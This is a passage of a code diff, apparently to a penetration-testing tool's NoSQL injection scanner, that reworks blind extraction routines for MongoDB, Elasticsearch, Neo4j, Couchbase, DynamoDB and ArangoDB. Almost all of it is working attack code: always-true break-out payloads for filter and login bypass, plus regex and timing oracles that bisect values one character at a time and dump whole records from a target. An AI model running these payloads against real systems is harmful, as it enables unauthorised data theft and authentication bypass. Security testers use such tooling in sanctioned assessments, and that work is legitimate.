+    response) enables relative true/false classification so an unrelated page is UNKNOWN, not false."""
 
     return _extract(template, lambda value: _fetchValue(place, parameter, value),
                     lambda n: payloadFor(".{%d,}" % n),
-                    lambda known, klass: payloadFor(_quoted(_javaEscape(known) + klass)))
+                    lambda known, klass: payloadFor(_quoted(_javaEscape(known) + klass)),
+                    strict=strict, falseModel=falseModel)
 
 def _enumDump(place, parameter, makePayload, keysExpr, valueExpr):
     """Whole-document dump via key enumeration for the regexp dialects: keysExpr(i) -> the i-th field
@@ -371,20 +771,37 @@ def _enumDump(place, parameter, makePayload, keysExpr, valueExpr):
     break-out and record binding around a '<targetExpr> matches ^<regexBody>' oracle. Returns
     (columns, rows) or None - the caller can then fall back to single-field extraction"""
 
-    template = _fetchValue(place, parameter, makePayload(keysExpr(0), ".*"))      # the bound single record
-    if not template or _isError(template):
+    # A whole-document dump is content-based, so it REQUIRES both models: a reproduced true (any-match)
+    # page, a reproduced false (never-match) page, and CLEAR SEPARATION between them. Without all three,
+    # classification would be one-sided (an unrelated usable page -> a fabricated false bit), so the dump
+    # is DISABLED (return None) - it must never run _enumField with falseModel=None in a live dump.
+    template = _reproduced(lambda: _fetchValue(place, parameter, makePayload(keysExpr(0), ".*")))
+    falseModel = _reproduced(lambda: _fetchValue(place, parameter, makePayload(keysExpr(0), NOSQL_SENTINEL)))
+    if not template or not falseModel or _ratio(template, falseModel) > UPPER_RATIO_BOUND:
+        logger.debug("NoSQL dump disabled: could not calibrate separable true/false models")
         return None
 
-    columns, values = [], []
+    columns, values, partial = [], [], False
     for index in xrange(NOSQL_MAX_FIELDS):
-        name = _enumField(place, parameter, template, lambda rb, i=index: makePayload(keysExpr(i), rb))
-        if not name:
+        try:
+            name = _enumField(place, parameter, template, lambda rb, i=index: makePayload(keysExpr(i), rb), strict=True, falseModel=falseModel)
+        except InconclusiveError:
+            partial = True                          # inconclusive NEXT field name != end of fields
+            logger.warning("field enumeration became inconclusive at index %d; dump is PARTIAL" % index)
+            break
+        if not name:                                # genuine end (no more keys)
             break
         columns.append(name)
-        values.append(_enumField(place, parameter, template, lambda rb, n=name: makePayload(valueExpr(n), rb)) or "")
+        cell = _enumField(place, parameter, template, lambda rb, n=name: makePayload(valueExpr(n), rb), falseModel=falseModel)
+        values.append(INCONCLUSIVE_MARK if cell is None else cell)   # None => aborted; keep distinguishable from ""
         logger.info("retrieved: %s='%s'" % (name, values[-1]))
 
-    return (columns, [values]) if columns else None
+    if partial:
+        logger.warning("document dump is INCOMPLETE (field enumeration aborted before end)")
+    # NOT bound by default: the caller's makePayload uses only a sibling `constraint` (which may match
+    # many records). A caller that pins a NATIVE id per record (e.g. _cypherDump's id(u)=k) marks its
+    # own result bound. `complete` = not partial.
+    return (columns, [values], False, not partial) if columns else None
 
 def _cypherDump(place, parameter):
     """Blind multi-record collection dump (Neo4j Cypher). Walks every matched node in ascending order
@@ -392,22 +809,33 @@ def _cypherDump(place, parameter):
     does not guarantee), key-enumerating each node's full document. Returns (columns, rows) or None"""
 
     fetch = lambda payload: _fetchValue(place, parameter, payload)
-    noMatch = fetch("%s' OR '1'='2" % NOSQL_SENTINEL)               # stable zero-record baseline (app closes the quote)
-    differs = lambda payload: _ratio(fetch(payload), noMatch) < UPPER_RATIO_BOUND
-    if not noMatch or not differs("%s' OR '1'='1" % NOSQL_SENTINEL):
-        return None
+    # DUAL model: a record-ABSENT page (zero rows) AND a record-PRESENT page (all rows). Existence is
+    # classified RELATIVE to both (shared resolveBit via _contentBit) - an unrelated usable page (e.g. a
+    # session-expired / soft-WAF page) leans to NEITHER and is INCONCLUSIVE, never fabricated as "exists".
+    absentModel = _reproduced(lambda: fetch("%s' OR '1'='2" % NOSQL_SENTINEL))
+    presentModel = _reproduced(lambda: fetch("%s' OR '1'='1" % NOSQL_SENTINEL))
+    if not absentModel or not presentModel or _ratio(presentModel, absentModel) > UPPER_RATIO_BOUND:
+        return None                                     # not separable / not usable -> cannot dump safely
 
-    # a numeric condition opens no string, so balance the app's trailing quote with a tautology
-    exists = lambda cond: differs("%s' OR %s AND '1'='1" % (NOSQL_SENTINEL, cond))
+    # a numeric condition opens no string, so balance the app's trailing quote with a tautology; `exists`
+    # is True only when the page leans to the present model over the absent model (retry/abort otherwise)
+    exists = lambda cond: _contentBit(lambda v: fetch("%s' OR %s AND '1'='1" % (NOSQL_SENTINEL, cond)), None, presentModel, absentModel)
 
     def minIdGreater(lower):
-        # smallest internal node id strictly greater than `lower` (None when no further node exists)
+        # smallest internal node id strictly greater than `lower` (None when no further node exists).
+        # Grow an INDEPENDENT positive span from `lower` (never multiply the bound itself: with
+        # lower=-1 the upper bound starts at 0 and `hi *= 2` stays 0 forever when node id 0 is absent -
+        # deleting the earliest nodes is enough to hang the scan). Bounded by both a numeric ceiling
+        # AND a probe cap.
         if not exists("id(u) > %d" % lower):
             return None
-        hi = lower + 1
+        span, probes = 1, 0
+        hi = lower + span
         while not exists("id(u) > %d AND id(u) <= %d" % (lower, hi)):
-            hi *= 2
-            if hi > (1 << 40):
+            span *= 2
+            hi = lower + span
+            probes += 1
+            if hi > (1 << 40) or probes > 64:
                 return None
         lo = lower
         while lo + 1 < hi:
@@ -418,23 +846,33 @@ def _cypherDump(place, parameter):
                 lo = mid
         return hi
 
-    columns, records, lastId = [], [], -1
-    for _ in xrange(NOSQL_MAX_RECORDS):
-        nodeId = minIdGreater(lastId)
-        if nodeId is None:
-            break
-        record = _enumDump(place, parameter,
-                           lambda expr, rb, k=nodeId: "%s' OR id(u)=%d AND %s =~ '^%s.*" % (NOSQL_SENTINEL, k, expr, rb),
-                           lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
-        if record:
-            cols, values = record
-            records.append(dict(zip(cols, values[0])))     # align by field name (keys(u) order is per-node)
-            columns.extend(_ for _ in cols if _ not in columns)
-        lastId = nodeId
-    else:
-        logger.warning("hit the NOSQL_MAX_RECORDS (%d) cap; some records may be omitted" % NOSQL_MAX_RECORDS)
+    columns, records, lastId, complete = [], [], -1, True
+    try:
+        for _ in xrange(NOSQL_MAX_RECORDS):
+            nodeId = minIdGreater(lastId)
+            if nodeId is None:
+                break
+            record = _enumDump(place, parameter,
+                               lambda expr, rb, k=nodeId: "%s' OR id(u)=%d AND %s =~ '^%s.*" % (NOSQL_SENTINEL, k, expr, rb),
+                               lambda i: "keys(u)[%d]" % i, lambda n: "toString(u[%s])" % _propLiteral(n))
+            if record:
+                cols, values, _b, recComplete = record         # each field bound to the SAME node by id(u)=k
+                records.append(dict(zip(cols, values[0])))     # align by field name (keys(u) order is per-node)
+                columns.extend(_ for _ in cols if _ not in columns)
+                if not recComplete:                            # a node's own fields were partially recovered
+                    complete = False
+            lastId = nodeId
+        else:
+            logger.warning("hit the NOSQL_MAX_RECORDS (%d) cap; some records may be omitted" % NOSQL_MAX_RECORDS)
+            complete = False
+    except InconclusiveError:
+        # the node-id walk hit a persistently unusable oracle: stop and return what was recovered so
+        # far (partial) rather than fabricate node existence from failed requests
+        complete = False
+        logger.warning("Cypher record walk aborted (oracle inconclusive); returning %d record(s) recovered so far" % len(records))
 
-    return (columns, [[row.get(_, "") for _ in columns] for row in records]) if records else None
+    # BOUND: every field of every record was pinned to a unique native node id (id(u)=k)
+    return (columns, [[row.get(_, "") for _ in columns] for row in records], True, complete) if records else None
 
 def _partiqlValue(place, parameter, bind, field):
     """Blind extraction of `field` for the bound record on a DynamoDB PartiQL point. PartiQL has no
@@ -443,24 +881,32 @@ def _partiqlValue(place, parameter, bind, field):
 
     quote = lambda value: value.replace("'", "''")              # PartiQL escapes a single quote by doubling it
     fetch = lambda payload: _fetchValue(place, parameter, payload)
-    template = fetch("%s' OR %s%s >= '" % (NOSQL_SENTINEL, bind, field))     # field >= '' -> bound record matches
-    if not template or _isError(template):
+    template = _reproduced(lambda: fetch("%s' OR %s%s >= '" % (NOSQL_SENTINEL, bind, field)))   # field >= '' -> match (TRUE model)
+    # FALSE model: `... OR '1'='2` never matches (the bound record is absent), so each comparison bit is
+    # classified relative to BOTH models; without it a session-expired/soft-WAF page would become a false
+    # bit. Cannot calibrate both -> disable extraction rather than one-side.
+    falseModel = _reproduced(lambda: fetch("%s' OR '1'='2" % NOSQL_SENTINEL))
+    if not template or not falseModel or _ratio(template, falseModel) > UPPER_RATIO_BOUND:
         return None
 
-    truth = lambda value: _ratio(fetch("%s' OR %s%s >= '%s" % (NOSQL_SENTINEL, bind, field, quote(value))), template) > UPPER_RATIO_BOUND
+    truth = lambda value: _contentBit(lambda v: fetch("%s' OR %s%s >= '%s" % (NOSQL_SENTINEL, bind, field, quote(v))), value, template, falseModel)
 
-    retVal = ""
-    while len(retVal) < NOSQL_MAX_LENGTH:
-        if not truth(retVal + chr(NOSQL_CHAR_MIN)):             # no character at this position -> end of value
-            break
-        lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
-        while lo < hi:
-            mid = (lo + hi + 1) // 2
-            if truth(retVal + chr(mid)):
-                lo = mid
-            else:
-                hi = mid - 1
-        retVal += chr(lo)
+    try:
+        retVal = ""
+        while len(retVal) < NOSQL_MAX_LENGTH:
+            if not truth(retVal + chr(NOSQL_CHAR_MIN)):         # no character at this position -> end of value
+                break
+            lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
+            while lo < hi:
+                mid = (lo + hi + 1) // 2
+                if truth(retVal + chr(mid)):
+                    lo = mid
+                else:
+                    hi = mid - 1
+            retVal += chr(lo)
+    except InconclusiveError:
+        logger.warning("PartiQL extraction aborted for a value (oracle inconclusive after retries)")
+        return None
 
     return retVal or None
 
@@ -472,48 +918,65 @@ def _partiqlDump(place, parameter, key):
     if not bind:                                                # need a sibling to pin a single record
         return None
     value = _partiqlValue(place, parameter, bind, key)
-    return ([key], [[value]]) if value is not None else None
+    # a single sibling is not proven to be the COMPLETE partition+sort key, so cardinality-one is not
+    # established -> representative (the recovered value could belong to any record matching `bind`)
+    return ([key], [[value]], False, True) if value is not None else None
 
-def _extract(template, fetchFn, lengthValue, charValue, truthFn=None):
+def _extract(template, fetchFn, lengthValue, charValue, truthFn=None, strict=False, falseModel=None):
     """Blind value recovery: binary-searches the length, then bisects each character's codepoint over
     the printable-ASCII range using regexp character-class ranges (sqlmap-style inference, ~log2(range)
     requests per character instead of a linear scan - far smaller WAF/log footprint). lengthValue(n)
     and charValue(known, charClass) render the dialect payload; the oracle is the content ratio against
-    `template` by default, or `truthFn(payload)` (e.g. the $where timing predicate)"""
+    `template` by default, or `truthFn(payload)` (e.g. the $where timing predicate).
 
-    truth = truthFn or (lambda value: _ratio(fetchFn(value), template) > UPPER_RATIO_BOUND)
+    Return contract distinguishes THREE outcomes so a structural caller never confuses them:
+      - a recovered value (incl. "" for a genuine zero-length value);
+      - InconclusiveError raised when `strict` and the oracle aborts (a structural probe - a field NAME
+        or a next-row pin - must treat this as UNKNOWN, not end-of-data);
+      - None returned when NOT `strict` and the oracle aborts (a per-value abort: caller renders a marker).
+    """
 
-    length, probe = 0, 1
-    while probe <= NOSQL_MAX_LENGTH and truth(lengthValue(probe)):
-        length, probe = probe, probe * 2
+    truth = truthFn or (lambda value: _contentBit(fetchFn, value, template, falseModel))
 
-    low, high = length, min(probe, NOSQL_MAX_LENGTH + 1)
-    while low + 1 < high:
-        mid = (low + high) // 2
-        if truth(lengthValue(mid)):
-            low = mid
-        else:
-            high = mid
+    try:
+        length, probe = 0, 1
+        while probe <= NOSQL_MAX_LENGTH and truth(lengthValue(probe)):
+            length, probe = probe, probe * 2
 
-    if not low:
-        return None
-
-    debugMsg = "retrieving the value (%d characters)" % low
-    logger.debug(debugMsg)
-
-    retVal = ""
-    for _ in xrange(low):
-        lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
-        if not truth(charValue(retVal, _klass(lo, hi))):
-            retVal += '?'                                       # character outside the printable-ASCII range
-            continue
-        while lo < hi:
-            mid = (lo + hi) // 2
-            if truth(charValue(retVal, _klass(lo, mid))):
-                hi = mid
+        low, high = length, min(probe, NOSQL_MAX_LENGTH + 1)
+        while low + 1 < high:
+            mid = (low + high) // 2
+            if truth(lengthValue(mid)):
+                low = mid
             else:
-                lo = mid + 1
-        retVal += chr(lo)
+                high = mid
+
+        if not low:
+            return ""                                           # genuine zero-length value / end (NOT abort)
+
+        debugMsg = "retrieving the value (%d characters)" % low
+        logger.debug(debugMsg)
+
+        retVal = ""
+        for _ in xrange(low):
+            lo, hi = NOSQL_CHAR_MIN, NOSQL_CHAR_MAX
+            if not truth(charValue(retVal, _klass(lo, hi))):
+                retVal += '?'                                   # character outside the printable-ASCII range
+                continue
+            while lo < hi:
+                mid = (lo + hi) // 2
+                if truth(charValue(retVal, _klass(lo, mid))):
+                    hi = mid
+                else:
+                    lo = mid + 1
+            retVal += chr(lo)
+    except InconclusiveError:
+        # a structural caller must SEE the abort (to mark the dump partial / abort), not read it as
+        # end-of-data; a per-value caller instead gets None and renders an inconclusive marker
+        logger.warning("NoSQL extraction aborted for a value (oracle inconclusive after retries)")
+        if strict:
+            raise
+        return None
 
     return retVal
 
@@ -526,41 +989,63 @@ def _resolve(place, parameter, key):
 
     template = _detectMongo(place, parameter)
     if template:
+        falseModel = _reproduced(lambda: _fetch(place, parameter, "$in", NOSQL_SENTINEL, isArray=True))   # matches nothing
         return Vector(_fingerprintMongo(place, parameter),
                       lambda value: _fetch(place, parameter, "$regex", value),
                       lambda n: "^.{%d,}$" % n,
                       lambda known, klass: "^%s%s" % (re.escape(known), klass),
-                      template=template, bypass='{"$ne": null}')
+                      template=template, bypass='{"$ne": null}', falseModel=falseModel)
 
     template = _detectES(place, parameter)
     if template:
+        falseModel = _reproduced(lambda: _fetchValue(place, parameter, NOSQL_SENTINEL))                   # literal sentinel matches nothing
         return Vector(_fingerprintLucene(place, parameter),
                       lambda value: _fetchValue(place, parameter, value),
                       lambda n: "/.{%d,}/" % n,
                       lambda known, klass: "/%s%s.*/" % (_lucene(known), klass),
-                      template=template, bypass='*')
+                      template=template, bypass='*', falseModel=falseModel)
 
     template = _detectCypher(place, parameter)
     if template:
         constraint = _constraint(place, parameter)
 
-        # Neo4j Cypher, Couchbase N1QL and DynamoDB PartiQL all share the ' OR '1'='1 break-out; tell
-        # them apart by the regexp/string primitive the back-end honors ('=~', 'REGEXP_CONTAINS', or
-        # PartiQL 'begins_with')
-        if not _confirm(place, parameter, "%s' OR %s%s =~ '.*" % (NOSQL_SENTINEL, constraint, field), "%s' OR %s%s =~ '%s" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)):
+        # Neo4j Cypher, Couchbase N1QL and DynamoDB PartiQL all share the ' OR '1'='1 break-out - which
+        # is ALSO identical to classic SQL string injection. Attribute a back-end ONLY on a positive,
+        # engine-specific primitive: Cypher '=~' regex or STARTS WITH, N1QL REGEXP_CONTAINS, PartiQL
+        # begins_with. If NONE confirms, this is a plain SQL string injection, not NoSQL -> return None
+        # (the old unconditional Neo4j fall-through turned every SQLi string parameter into a false Neo4j).
+        # NOTE the confirm pairs differ ONLY in the engine-specific clause ('=~' regex body, or the
+        # STARTS WITH prefix), with an IDENTICAL false tautology tail on both sides - so the
+        # divergence is attributable to the Cypher primitive alone, never to the shared '1'='x'
+        # tautology (which a SQL back-end would also flip).
+        cypher = _confirm(place, parameter, "%s' OR %s%s =~ '.*" % (NOSQL_SENTINEL, constraint, field), "%s' OR %s%s =~ '%s" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)) \
+            or _confirmBattery(place, parameter,
+                               lambda p: "%s' OR %s OR '1'='2" % (NOSQL_SENTINEL, p),
+                               lambda p: "%s' OR %s OR '1'='2" % (NOSQL_SENTINEL, p), _CYPHER_PREDICATES)
+        if not cypher:
             if _confirm(place, parameter, "%s' OR REGEXP_CONTAINS(%s, '.*') OR '1'='2" % (NOSQL_SENTINEL, field), "%s' OR REGEXP_CONTAINS(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, field, NOSQL_SENTINEL)):
+                # bind EVERY probe (length, char, key-index, value) to the sibling-identified record by
+                # AND-ing the `constraint` into the OR-clause: `... OR (u.id='7' AND REGEXP_CONTAINS(..))
+                # OR ...`. Without this the key/value predicates could match DIFFERENT documents, so a
+                # `bound=True` label would be false (the reviewer's P0-6). When `constraint` is empty the
+                # clause is just the predicate and bound=False, honestly marking the dump representative.
+                # never-matching regexp body = the FALSE model (bound identically to the extraction)
+                cbFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)))
                 return Vector("Couchbase",
                               lambda value: _fetchValue(place, parameter, value),
-                              lambda n: "%s' OR REGEXP_CONTAINS(%s, '^.{%d,}') OR '1'='2" % (NOSQL_SENTINEL, field, n),
-                              lambda known, klass: "%s' OR REGEXP_CONTAINS(%s, '^%s') OR '1'='2" % (NOSQL_SENTINEL, field, _quoted(_javaEscape(known) + klass)),
+                              lambda n: "%s' OR (%sREGEXP_CONTAINS(%s, '^.{%d,}')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, n),
+                              lambda known, klass: "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, field, _quoted(_javaEscape(known) + klass)),
                               template=template, bypass="' OR '1'='1",
                               dump=lambda: _enumDump(place, parameter,
-                                                     lambda expr, rb: "%s' OR REGEXP_CONTAINS(%s, '^%s') OR '1'='2" % (NOSQL_SENTINEL, expr, rb),
-                                                     lambda i: "OBJECT_NAMES(u)[%d]" % i, lambda n: "TOSTRING(u[%s])" % _propLiteral(n)))
+                                                     lambda expr, rb: "%s' OR (%sREGEXP_CONTAINS(%s, '^%s')) OR '1'='2" % (NOSQL_SENTINEL, constraint, expr, rb),
+                                                     lambda i: "OBJECT_NAMES(u)[%d]" % i, lambda n: "TOSTRING(u[%s])" % _propLiteral(n)),
+                              bound=bool(constraint), falseModel=cbFalse)
 
             if _confirm(place, parameter, "%s' OR begins_with(%s, '') OR '1'='2" % (NOSQL_SENTINEL, key), "%s' OR begins_with(%s, '%s') OR '1'='2" % (NOSQL_SENTINEL, key, NOSQL_SENTINEL)):
                 return Vector("DynamoDB", None, None, None, template=template, bypass="' OR '1'='1",
                               dump=lambda: _partiqlDump(place, parameter, key))
+
+            return None     # SQL-shared break-out with no Cypher/N1QL/PartiQL primitive -> not NoSQL
 
         return Vector("Neo4j", None, None, None, template=template, bypass="' OR '1'='1",
                       dump=lambda: _cypherDump(place, parameter) or _enumDump(place, parameter,
@@ -572,17 +1057,23 @@ def _resolve(place, parameter, key):
         constraint = _constraint(place, parameter, "==", " && ")
 
         # ArangoDB AQL and MongoDB $where (server-side JavaScript) both satisfy the ' || '1'=='1
-        # break-out; tell them apart by which regexp-match primitive holds - AQL '=~' or a JS /re/.test()
-        if not _confirm(place, parameter, "%s' || ('x' =~ '.') || '1'=='2" % NOSQL_SENTINEL, "%s' || ('x' =~ 'y') || '1'=='2" % NOSQL_SENTINEL) \
-           and _confirm(place, parameter, "%s' || /./.test('x') || '1'=='2" % NOSQL_SENTINEL, "%s' || /y/.test('x') || '1'=='2" % NOSQL_SENTINEL):
-            bound = _constraint(place, parameter, "==", "&&", prefix="this.")
-            whereTemplate = _fetchValue(place, parameter, "%s' || (%sthis.%s) || '1'=='2" % (NOSQL_SENTINEL, bound, key))
-            return Vector("MongoDB ($where)",
-                          lambda value: _fetchValue(place, parameter, value),
-                          lambda n: "%s' || (%sthis.%s&&this.%s.length>=%d) || '1'=='2" % (NOSQL_SENTINEL, bound, key, key, n),
-                          lambda known, klass: "%s' || (%sthis.%s&&/^%s%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, _javaEscape(known), klass, key),
-                          template=whereTemplate, bypass="' || '1'=='1")
+        # break-out; tell them apart by which regexp-match primitive holds - AQL '=~' or a JS /re/.test().
+        # Attribute a back-end ONLY on a positive primitive; if NEITHER confirms, don't default to
+        # ArangoDB (that would be an unconfirmed attribution) - return None.
+        aqlRegex = _confirm(place, parameter, "%s' || ('x' =~ '.') || '1'=='2" % NOSQL_SENTINEL, "%s' || ('x' =~ 'y') || '1'=='2" % NOSQL_SENTINEL)
+        if not aqlRegex:
+            if _confirm(place, parameter, "%s' || /./.test('x') || '1'=='2" % NOSQL_SENTINEL, "%s' || /y/.test('x') || '1'=='2" % NOSQL_SENTINEL):
+                bound = _constraint(place, parameter, "==", "&&", prefix="this.")
+                whereTemplate = _fetchValue(place, parameter, "%s' || (%sthis.%s) || '1'=='2" % (NOSQL_SENTINEL, bound, key))
+                whereFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' || (%sthis.%s&&/%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, NOSQL_SENTINEL, key)))
+                return Vector("MongoDB ($where)",
+                              lambda value: _fetchValue(place, parameter, value),
+                              lambda n: "%s' || (%sthis.%s&&this.%s.length>=%d) || '1'=='2" % (NOSQL_SENTINEL, bound, key, key, n),
+                              lambda known, klass: "%s' || (%sthis.%s&&/^%s%s/.test(this.%s)) || '1'=='2" % (NOSQL_SENTINEL, bound, key, _javaEscape(known), klass, key),
+                              template=whereTemplate, bypass="' || '1'=='1", falseModel=whereFalse)
+            return None
 
+        aqlFalse = _reproduced(lambda: _fetchValue(place, parameter, "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, NOSQL_SENTINEL)))
         return Vector("ArangoDB",
                       lambda value: _fetchValue(place, parameter, value),
                       lambda n: "%s' || (%s%s =~ '^.{%d,}') || '1'=='2" % (NOSQL_SENTINEL, constraint, field, n),
@@ -590,7 +1081,8 @@ def _resolve(place, parameter, key):
                       template=template, bypass="' || '1'=='1",
                       dump=lambda: _enumDump(place, parameter,
                                              lambda expr, rb: "%s' || (%s%s =~ '^%s') || '1'=='2" % (NOSQL_SENTINEL, constraint, expr, rb),
-                                             lambda i: "ATTRIBUTES(u)[%d]" % i, lambda n: "TO_STRING(u[%s])" % _propLiteral(n)))
+                                             lambda i: "ATTRIBUTES(u)[%d]" % i, lambda n: "TO_STRING(u[%s])" % _propLiteral(n)),
+                      bound=bool(constraint), falseModel=aqlFalse)
 
     numeric = _detectNumeric(place, parameter)
     if numeric:
@@ -606,8 +1098,11 @@ def _resolve(place, parameter, key):
     threshold = _detectWhere(place, parameter)
     if threshold is not None:
         bound = _constraint(place, parameter, "==", "&&", prefix="d.")
+        # with no sibling constraint the $where busy-loop matches whichever document(s) the scan
+        # reaches, so Object.keys(d)/String(d[k]) are not proven to come from ONE record -> representative
         return Vector("MongoDB ($where)", None, None, None,
-                      dump=lambda: _whereDump(place, parameter, bound, threshold))
+                      dump=lambda: _whereDump(place, parameter, bound, threshold),
+                      bound=bool(bound))
 
     engine = _detectError(place, parameter)
     if engine:
@@ -621,6 +1116,8 @@ def _inband(place, parameter, template):
     directly - else None"""
 
     original = _fetchValue(place, parameter, _originalValue(place, parameter) or "1")
+    if original is None:            # a blocked/failed baseline is UNKNOWN - not a basis for comparison
+        return None
     if template and len(template) > len(original) and _ratio(template, original) < UPPER_RATIO_BOUND and not re.search(NOSQL_ERROR_REGEX, template):
         return template
     return None
@@ -687,8 +1184,9 @@ def nosqlScan():
     confirmed point it tries, in order, to (1) dump records exposed in-band by the always-true payload
     and (2) blindly recover the targeted field via the regexp/timing oracle"""
 
-    global NOSQL_SENTINEL
+    global NOSQL_SENTINEL, _sqlErrorSeen
     NOSQL_SENTINEL = randomStr(length=10, lowercase=True)
+    _sqlErrorSeen = False
 
     # NoSQL injection from an application-scoped point is confined to the back-end's single query
     # (one collection/label) - it confirms and dumps what that query can reach, with no analog to the
@@ -740,7 +1238,9 @@ def nosqlScan():
             conf.dumper.singleString(report)
 
             if vector.bypass:
-                infoMsg = "%s parameter '%s' can be coerced always-true with '%s' (e.g. authentication/filter bypass)" % (place, key, vector.bypass)
+                # report the payload ACTUALLY tested (e.g. '[$ne]=<sentinel>'), not an idealized form
+                # like '{"$ne": null}' that was never sent - `null` can behave differently server-side
+                infoMsg = "%s parameter '%s' can be coerced always-true with '%s' (e.g. authentication/filter bypass)" % (place, key, payload)
                 logger.info(infoMsg)
 
             dumped = False
@@ -751,10 +1251,23 @@ def nosqlScan():
                 logger.info(infoMsg)
                 records = vector.dump()
                 if records:
-                    columns, rows = records
-                    infoMsg = "dumped %d record%s (%d field%s)" % (len(rows), 's' if len(rows) != 1 else '', len(columns), 's' if len(columns) != 1 else '')
-                    logger.info(infoMsg)
-                    conf.dumper.singleString("NoSQL: %s parameter '%s' %s:\n%s" % (place, key, "documents" if len(rows) != 1 else "document", _grid(columns, rows)))
+                    # dump implementations return (columns, rows, bound, complete): `bound` reflects the
+                    # vector that ACTUALLY succeeded (a native record id pinned in every predicate);
+                    # `complete` is False when enumeration aborted / hit a cap. Both statuses are shown
+                    # in the FINAL dumper header, not merely logged, so a partial/representative result
+                    # is never presented as a complete coherent document.
+                    columns, rows, bound, complete = records
+                    logger.info("dumped %d record%s (%d field%s)" % (len(rows), 's' if len(rows) != 1 else '', len(columns), 's' if len(columns) != 1 else ''))
+                    status = []
+                    if not bound:
+                        status.append("REPRESENTATIVE: record identity unproven")
+                        logger.warning("no unique-record binding (no native record id / cardinality-one proof); fields below are REPRESENTATIVE and may not all belong to the same document")
+                    if not complete:
+                        status.append("PARTIAL: oracle inconclusive / cap reached")
+                        logger.warning("the document dump is INCOMPLETE")
+                    header = "documents" if len(rows) != 1 else "document"
+                    tag = (" [%s]" % "; ".join(status)) if status else " [COMPLETE]"
+                    conf.dumper.singleString("NoSQL: %s parameter '%s' %s%s:\n%s" % (place, key, header, tag, _grid(columns, rows)))
                     dumped = True
 
             if not dumped and vector.template is not None:
@@ -766,10 +1279,18 @@ def nosqlScan():
                     dumped = True
 
             if vector.lengthValue is not None:
-                value = _extract(vector.template, vector.fetch, vector.lengthValue, vector.charValue, vector.truth)
-                if value is not None:
-                    conf.dumper.singleString("NoSQL: %s parameter '%s' -> %s" % (place, key, repr(value)))
-                    dumped = True
+                # content extraction needs BOTH models: without a calibrated false model, classification
+                # would be one-sided (an unrelated usable page -> a fabricated false bit), so DISABLE
+                # extraction rather than risk corrupt data (the reviewer's invariant)
+                if vector.truth is None and vector.falseModel is None:
+                    logger.warning("%s parameter '%s': content extraction disabled - could not calibrate a false model "
+                                   "(one-sided classification risks fabricated values)" % (place, key))
+                else:
+                    value = _extract(vector.template, vector.fetch, vector.lengthValue, vector.charValue,
+                                     vector.truth, falseModel=vector.falseModel)
+                    if value is not None:
+                        conf.dumper.singleString("NoSQL: %s parameter '%s' -> %s" % (place, key, repr(value)))
+                        dumped = True
 
             if not dumped:
                 if vector.template is None and vector.truth is None and vector.dump is None:
@@ -781,5 +1302,9 @@ def nosqlScan():
     if not found:
         warnMsg = "no parameter appears to be injectable via NoSQL injection (%d tested)" % tested
         logger.warning(warnMsg)
+        if _sqlErrorSeen:
+            warnMsg = "a NoSQL probe triggered a back-end DBMS (SQL) error, which strongly suggests the "
+            warnMsg += "target is a classic SQL injection - re-run without '--nosql' to test for it"
+            logger.warning(warnMsg)
 
     logger.info("NoSQL scan complete")
